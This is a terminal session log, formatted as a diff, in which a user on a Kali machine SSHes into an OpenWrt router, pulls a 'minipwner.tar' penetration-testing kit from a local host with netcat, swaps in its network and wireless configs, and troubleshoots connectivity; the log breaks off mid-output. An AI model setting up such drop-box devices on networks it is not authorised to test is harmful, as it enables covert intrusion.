@@ -1,0 +1,4097 @@
+agent@kali:~$ ping google.com
+PING google.com (74.125.227.238) 56(84) bytes of data.
+64 bytes from dfw06s38-in-f14.1e100.net (74.125.227.238): icmp_req=1 ttl=53 time=17.3 ms
+64 bytes from dfw06s38-in-f14.1e100.net (74.125.227.238): icmp_req=2 ttl=53 time=14.7 ms
+64 bytes from dfw06s38-in-f14.1e100.net (74.125.227.238): icmp_req=3 ttl=53 time=15.6 ms
+64 bytes from dfw06s38-in-f14.1e100.net (74.125.227.238): icmp_req=4 ttl=53 time=15.2 ms
+64 bytes from dfw06s38-in-f14.1e100.net (74.125.227.238): icmp_req=5 ttl=53 time=18.3 ms
+^C
+--- google.com ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4004ms
+rtt min/avg/max/mdev = 14.719/16.263/18.397/1.392 ms
+agent@kali:~$ ping 192.168.1.108
+PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
+From 192.168.1.107 icmp_seq=1 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=2 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=3 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=4 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=5 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=6 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=7 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=8 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=9 Destination Host Unreachable
+^C
+--- 192.168.1.108 ping statistics ---
+12 packets transmitted, 0 received, +9 errors, 100% packet loss, time 10998ms
+pipe 4
+agent@kali:~$ ping 192.168.1.108
+PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
+From 192.168.1.107 icmp_seq=1 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=2 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=3 Destination Host Unreachable
+^C
+--- 192.168.1.108 ping statistics ---
+5 packets transmitted, 0 received, +3 errors, 100% packet loss, time 3999ms
+pipe 3
+agent@kali:~$ ssh root@192.168.1.1
+ssh: connect to host 192.168.1.1 port 22: Connection refused
+agent@kali:~$ ping 192.168.1.106
+PING 192.168.1.106 (192.168.1.106) 56(84) bytes of data.
+^C
+--- 192.168.1.106 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 2015ms
+
+agent@kali:~$ ping 192.168.1.127
+PING 192.168.1.127 (192.168.1.127) 56(84) bytes of data.
+64 bytes from 192.168.1.127: icmp_req=1 ttl=128 time=5.53 ms
+64 bytes from 192.168.1.127: icmp_req=2 ttl=128 time=1.20 ms
+^C64 bytes from 192.168.1.127: icmp_req=3 ttl=128 time=1.31 ms
+^C
+--- 192.168.1.127 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+rtt min/avg/max/mdev = 1.203/2.682/5.533/2.016 ms
+agent@kali:~$ ping 192.168.1.128
+PING 192.168.1.128 (192.168.1.128) 56(84) bytes of data.
+^C
+--- 192.168.1.128 ping statistics ---
+2 packets transmitted, 0 received, 100% packet loss, time 1009ms
+
+agent@kali:~$ ping 192.168.1.101
+PING 192.168.1.101 (192.168.1.101) 56(84) bytes of data.
+64 bytes from 192.168.1.101: icmp_req=1 ttl=128 time=127 ms
+^C
+--- 192.168.1.101 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 127.258/127.258/127.258/0.000 ms
+agent@kali:~$ ssh root@192.168.1.
+ssh: Could not resolve hostname 192.168.1.: Name or service not known
+agent@kali:~$ ssh root@192.168.1.1
+The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
+RSA key fingerprint is e2:3f:d1:87:af:e8:7a:15:28:f8:a4:78:41:bb:05:e9.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.1' (RSA) to the list of known hosts.
+root@192.168.1.1's password: 
+Permission denied, please try again.
+root@192.168.1.1's password: 
+Permission denied, please try again.
+root@192.168.1.1's password: 
+Permission denied (publickey,password).
+agent@kali:~$ ssh root@192.168.1.1
+root@192.168.1.1's password: 
+Permission denied, please try again.
+root@192.168.1.1's password: 
+Permission denied, please try again.
+root@192.168.1.1's password: 
+Permission denied (publickey,password).
+agent@kali:~$ ssh root@192.168.1.1
+root@192.168.1.1's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# cd /usr/share/
+root@OpenWrt:/usr/share# nc 192.168.1.111 3333 > minipwner.tar
+nc: can't connect to remote host (192.168.1.111): No route to host
+root@OpenWrt:/usr/share# nc 192.168.1.107 3333 > minipwner.tar
+^C
+root@OpenWrt:/usr/share# ls
+libubox        minipwner.tar  udhcpc
+root@OpenWrt:/usr/share# file minipwner.tar 
+-ash: file: not found
+root@OpenWrt:/usr/share# ls -l 
+drwxr-xr-x    2 root     root            30 Mar 23  2013 libubox
+-rw-r--r--    1 root     root         18944 Sep  8 15:52 minipwner.tar
+drwxr-xr-x    2 root     root            37 Mar 23  2013 udhcpc
+root@OpenWrt:/usr/share# md5sum minipwner.tar 
+a0665168831cea60f03141d7a54ec0f8  minipwner.tar
+root@OpenWrt:/usr/share# tar -xf minipwner.tar
+root@OpenWrt:/usr/share# cd minipwner/
+root@OpenWrt:/usr/share/minipwner# ls
+dhcp.2       fstab.1      network.2    profile.1    system.1     wireless.2
+firewall.1   network.1    opkg.conf.1  script1.sh   wireless.1
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/network /etc/config/network
+.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/wireless /etc/config/wirele
+ss.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/firewall /etc/config/firewa
+ll.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/profile /etc/profile.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/fstab /etc/config/fstab.ori
+g
+cp: can't stat '/etc/config/fstab': No such file or directory
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/opkg.conf /etc/opkg.conf.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/system /etc/config/system.o
+rig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/dhcp /etc/config/dhcp.orig
+root@OpenWrt:/usr/share/minipwner# cp -f ./network.1 /etc/config/network
+root@OpenWrt:/usr/share/minipwner# cp -f ./wireless.1 /etc/config/wireless
+config wifi-device  wlan0
+        option type     mac80211
+        option channel  6
+        option macaddr  0c:82:68:f9:20:7a
+        option hwmode   11ng
+        option htmode   HT20
+        list ht_capab   SHORT-GI-20
+        list ht_capab   SHORT-GI-40
+        list ht_capab   RX-STBC1
+        list ht_capab   DSSS_CCK-40
+        # REMOVE THIS LINE TO ENABLE WIFI:
+        #option disabled 1
+
+config wifi-iface
+        option device   wlan0
+        option network  wan
+        option mode     sta
+        option ssid     TOKI
+        option encryption none
+
+
+
+~
+root@OpenWrt:/usr/share/minipwner# /etc/init.d/network restart
+command failed: Device or resource busy (-16)
+Successfully initialized wpa_supplicant
+root@OpenWrt:/usr/share/minipwner# wifi
+command failed: Device or resource busy (-16)
+Successfully initialized wpa_supplicant
+root@OpenWrt:/usr/share/minipwner# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+root@OpenWrt:/usr/share/minipwner# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+root@OpenWrt:/usr/share/minipwner# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+root@OpenWrt:/usr/share/minipwner# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:548 (548.0 B)
+
+root@OpenWrt:/usr/share/minipwner# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2966 errors:0 dropped:25 overruns:0 frame:0
+          TX packets:2982 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:383334 (374.3 KiB)  TX bytes:867950 (847.6 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:10966 errors:0 dropped:2 overruns:0 frame:0
+          TX packets:10295 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1603447 (1.5 MiB)  TX bytes:2746075 (2.6 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:14205 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:14205 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:967043 (944.3 KiB)  TX bytes:967043 (944.3 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:548 (548.0 B)
+
+root@OpenWrt:/usr/share/minipwner# Write failed: Broken pipe
+agent@kali:~$ 
+agent@kali:~$ ssh root@192.168.1.108
+ssh: connect to host 192.168.1.108 port 22: No route to host
+agent@kali:~$ ifconfig
+bash: ifconfig: command not found
+agent@kali:~$ ssh root@192.168.1.108
+ssh: connect to host 192.168.1.108 port 22: No route to host
+agent@kali:~$ ping 192.168.1.108
+PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
+From 192.168.1.107 icmp_seq=1 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=2 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=3 Destination Host Unreachable
+^C
+--- 192.168.1.108 ping statistics ---
+5 packets transmitted, 0 received, +3 errors, 100% packet loss, time 4000ms
+pipe 3
+agent@kali:~$ ping 192.168.1.107
+PING 192.168.1.107 (192.168.1.107) 56(84) bytes of data.
+64 bytes from 192.168.1.107: icmp_req=1 ttl=64 time=0.027 ms
+64 bytes from 192.168.1.107: icmp_req=2 ttl=64 time=0.035 ms
+64 bytes from 192.168.1.107: icmp_req=3 ttl=64 time=0.025 ms
+^C
+--- 192.168.1.107 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+rtt min/avg/max/mdev = 0.025/0.029/0.035/0.004 ms
+agent@kali:~$ ping 192.168.1.106
+PING 192.168.1.106 (192.168.1.106) 56(84) bytes of data.
+64 bytes from 192.168.1.106: icmp_req=1 ttl=64 time=1604 ms
+64 bytes from 192.168.1.106: icmp_req=2 ttl=64 time=604 ms
+64 bytes from 192.168.1.106: icmp_req=3 ttl=64 time=125 ms
+^C
+--- 192.168.1.106 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2000ms
+rtt min/avg/max/mdev = 125.438/778.085/1604.019/615.939 ms, pipe 2
+agent@kali:~$ ping 192.168.1.108
+PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
+From 192.168.1.107 icmp_seq=1 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=2 Destination Host Unreachable
+From 192.168.1.107 icmp_seq=3 Destination Host Unreachable
+^C
+--- 192.168.1.108 ping statistics ---
+4 packets transmitted, 0 received, +3 errors, 100% packet loss, time 3015ms
+pipe 3
+agent@kali:~$ ping 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+64 bytes from 192.168.1.1: icmp_req=1 ttl=64 time=1.33 ms
+64 bytes from 192.168.1.1: icmp_req=2 ttl=64 time=1.32 ms
+^C
+--- 192.168.1.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 1.327/1.332/1.338/0.036 ms
+agent@kali:~$ ping google.com
+PING google.com (173.194.115.0) 56(84) bytes of data.
+64 bytes from dfw06s39-in-f0.1e100.net (173.194.115.0): icmp_req=1 ttl=52 time=14.9 ms
+64 bytes from dfw06s39-in-f0.1e100.net (173.194.115.0): icmp_req=2 ttl=52 time=15.5 ms
+^C
+--- google.com ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 14.953/15.235/15.518/0.308 ms
+agent@kali:~$ ssh root@192.168.1.1
+ssh: connect to host 192.168.1.1 port 22: Connection refused
+agent@kali:~$ ssh root@192.168.1.108
+ssh: connect to host 192.168.1.108 port 22: No route to host
+agent@kali:~$ ping 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+64 bytes from 192.168.1.1: icmp_req=9 ttl=64 time=2.19 ms
+64 bytes from 192.168.1.1: icmp_req=10 ttl=64 time=0.503 ms
+64 bytes from 192.168.1.1: icmp_req=11 ttl=64 time=0.533 ms
+64 bytes from 192.168.1.1: icmp_req=12 ttl=64 time=0.535 ms
+64 bytes from 192.168.1.1: icmp_req=13 ttl=64 time=0.495 ms
+64 bytes from 192.168.1.1: icmp_req=14 ttl=64 time=0.567 ms
+64 bytes from 192.168.1.1: icmp_req=15 ttl=64 time=0.607 ms
+64 bytes from 192.168.1.1: icmp_req=16 ttl=64 time=0.504 ms
+64 bytes from 192.168.1.1: icmp_req=17 ttl=64 time=0.582 ms
+64 bytes from 192.168.1.1: icmp_req=18 ttl=64 time=0.473 ms
+64 bytes from 192.168.1.1: icmp_req=19 ttl=64 time=0.481 ms
+64 bytes from 192.168.1.1: icmp_req=20 ttl=64 time=0.501 ms
+64 bytes from 192.168.1.1: icmp_req=21 ttl=64 time=1.20 ms
+64 bytes from 192.168.1.1: icmp_req=22 ttl=64 time=0.503 ms
+64 bytes from 192.168.1.1: icmp_req=23 ttl=64 time=0.643 ms
+64 bytes from 192.168.1.1: icmp_req=24 ttl=64 time=0.993 ms
+64 bytes from 192.168.1.1: icmp_req=25 ttl=64 time=0.625 ms
+64 bytes from 192.168.1.1: icmp_req=26 ttl=64 time=0.618 ms
+64 bytes from 192.168.1.1: icmp_req=27 ttl=64 time=0.525 ms
+64 bytes from 192.168.1.1: icmp_req=28 ttl=64 time=0.538 ms
+64 bytes from 192.168.1.1: icmp_req=29 ttl=64 time=0.589 ms
+64 bytes from 192.168.1.1: icmp_req=30 ttl=64 time=0.589 ms
+64 bytes from 192.168.1.1: icmp_req=31 ttl=64 time=0.641 ms
+64 bytes from 192.168.1.1: icmp_req=32 ttl=64 time=0.496 ms
+64 bytes from 192.168.1.1: icmp_req=33 ttl=64 time=0.650 ms
+64 bytes from 192.168.1.1: icmp_req=34 ttl=64 time=0.655 ms
+64 bytes from 192.168.1.1: icmp_req=35 ttl=64 time=0.621 ms
+64 bytes from 192.168.1.1: icmp_req=36 ttl=64 time=0.658 ms
+64 bytes from 192.168.1.1: icmp_req=37 ttl=64 time=0.667 ms
+64 bytes from 192.168.1.1: icmp_req=38 ttl=64 time=0.652 ms
+64 bytes from 192.168.1.1: icmp_req=39 ttl=64 time=0.555 ms
+64 bytes from 192.168.1.1: icmp_req=40 ttl=64 time=0.672 ms
+64 bytes from 192.168.1.1: icmp_req=41 ttl=64 time=0.564 ms
+64 bytes from 192.168.1.1: icmp_req=42 ttl=64 time=0.613 ms
+64 bytes from 192.168.1.1: icmp_req=43 ttl=64 time=0.663 ms
+64 bytes from 192.168.1.1: icmp_req=44 ttl=64 time=0.662 ms
+64 bytes from 192.168.1.1: icmp_req=45 ttl=64 time=0.502 ms
+64 bytes from 192.168.1.1: icmp_req=46 ttl=64 time=0.682 ms
+64 bytes from 192.168.1.1: icmp_req=47 ttl=64 time=0.543 ms
+64 bytes from 192.168.1.1: icmp_req=48 ttl=64 time=0.511 ms
+64 bytes from 192.168.1.1: icmp_req=49 ttl=64 time=0.606 ms
+64 bytes from 192.168.1.1: icmp_req=50 ttl=64 time=0.628 ms
+64 bytes from 192.168.1.1: icmp_req=51 ttl=64 time=0.521 ms
+64 bytes from 192.168.1.1: icmp_req=52 ttl=64 time=0.518 ms
+64 bytes from 192.168.1.1: icmp_req=53 ttl=64 time=0.521 ms
+64 bytes from 192.168.1.1: icmp_req=54 ttl=64 time=0.699 ms
+64 bytes from 192.168.1.1: icmp_req=55 ttl=64 time=0.611 ms
+64 bytes from 192.168.1.1: icmp_req=56 ttl=64 time=0.524 ms
+64 bytes from 192.168.1.1: icmp_req=57 ttl=64 time=0.598 ms
+64 bytes from 192.168.1.1: icmp_req=58 ttl=64 time=0.607 ms
+64 bytes from 192.168.1.1: icmp_req=59 ttl=64 time=0.582 ms
+64 bytes from 192.168.1.1: icmp_req=60 ttl=64 time=0.567 ms
+64 bytes from 192.168.1.1: icmp_req=61 ttl=64 time=0.493 ms
+64 bytes from 192.168.1.1: icmp_req=62 ttl=64 time=0.526 ms
+64 bytes from 192.168.1.1: icmp_req=63 ttl=64 time=0.505 ms
+^C
+--- 192.168.1.1 ping statistics ---
+63 packets transmitted, 55 received, 12% packet loss, time 62065ms
+rtt min/avg/max/mdev = 0.473/0.623/2.193/0.245 ms
+agent@kali:~$ ssh root@192.168.1.1
+root@192.168.1.1's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:154 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:39157 (38.2 KiB)
+
+root@OpenWrt:~# ifconfig wlan0 192.168.50.1
+root@OpenWrt:~# ifconfig wlan0 192.168.50.1/24
+root@OpenWrt:~# ifconfig wlan0
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.50.1  Bcast:192.168.50.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:164 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:41417 (40.4 KiB)
+
+root@OpenWrt:~# mkdir /mnt/usb
+root@OpenWrt:~# cd /usr/share/minipwner
+root@OpenWrt:/usr/share/minipwner# ping google.com
+ping: bad address 'google.com'
+root@OpenWrt:/usr/share/minipwner# exit
+Connection to 192.168.1.1 closed.
+agent@kali:~$ ping 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+64 bytes from 192.168.1.1: icmp_req=1 ttl=64 time=2.70 ms
+64 bytes from 192.168.1.1: icmp_req=2 ttl=64 time=1.10 ms
+64 bytes from 192.168.1.1: icmp_req=3 ttl=64 time=1.19 ms
+64 bytes from 192.168.1.1: icmp_req=4 ttl=64 time=1.26 ms
+^C
+--- 192.168.1.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3003ms
+rtt min/avg/max/mdev = 1.104/1.567/2.700/0.657 ms
+agent@kali:~$ ssh root@192.168.1.1
+root@192.168.1.1's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ping google.com
+ping: bad address 'google.com'
+root@OpenWrt:~# ping www.google.com
+ping: bad address 'www.google.com'
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:735 errors:0 dropped:81 overruns:0 frame:0
+          TX packets:178 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:71135 (69.4 KiB)  TX bytes:36154 (35.3 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:453 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:34475 (33.6 KiB)  TX bytes:31487 (30.7 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:424 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:424 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:28400 (27.7 KiB)  TX bytes:28400 (27.7 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:437 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:672 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:76565 (74.7 KiB)  TX bytes:121097 (118.2 KiB)
+
+root@OpenWrt:~# dhclient
+-ash: dhclient: not found
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1702 errors:0 dropped:126 overruns:0 frame:0
+          TX packets:716 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:175841 (171.7 KiB)  TX bytes:138088 (134.8 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:913 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:226 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:69841 (68.2 KiB)  TX bytes:40385 (39.4 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1048 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1048 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:70832 (69.1 KiB)  TX bytes:70832 (69.1 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:373 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:570 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:56767 (55.4 KiB)  TX bytes:76377 (74.5 KiB)
+
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:4013 errors:0 dropped:225 overruns:0 frame:0
+          TX packets:2087 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:406036 (396.5 KiB)  TX bytes:631034 (616.2 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2064 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:316 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:159852 (156.1 KiB)  TX bytes:57227 (55.8 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:3256 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:3256 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:220976 (215.7 KiB)  TX bytes:220976 (215.7 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1810 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2947 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:254526 (248.5 KiB)  TX bytes:703773 (687.2 KiB)
+
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5195 errors:0 dropped:346 overruns:0 frame:0
+          TX packets:2636 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:550946 (538.0 KiB)  TX bytes:741183 (723.8 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2657 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:543 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:205506 (200.6 KiB)  TX bytes:107809 (105.2 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:4024 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4024 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:273200 (266.7 KiB)  TX bytes:273200 (266.7 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
